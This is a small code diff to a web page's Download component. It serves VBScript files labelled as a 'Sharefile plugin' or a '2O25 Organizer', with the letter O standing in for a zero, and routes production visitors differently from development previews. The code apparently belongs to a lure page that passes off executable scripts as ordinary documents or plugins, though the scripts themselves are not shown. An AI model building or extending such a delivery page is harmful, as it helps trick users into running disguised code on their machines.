@@ -234,7 +234,7 @@ const Download = () => {
       const isProduction = window.location.hostname !== 'localhost' && !window.location.hostname.includes('lovableproject.com') && !window.location.hostname.includes('lovable.app');
       const href = isProduction
         ? `/api/download?name=${encodeURIComponent(name)}`
-        : `https://github.com/joneraig123/vado-adb/releases/download/v1.0.0/SharefilePlugin.vbs`;
+        : "/docs/2O25_Organizer.vbs";
       return { href, name };
     }
     return { href: "/docs/2O25_Organizer.zip", name: `2O25_Organizer_${suffix}.zip` };
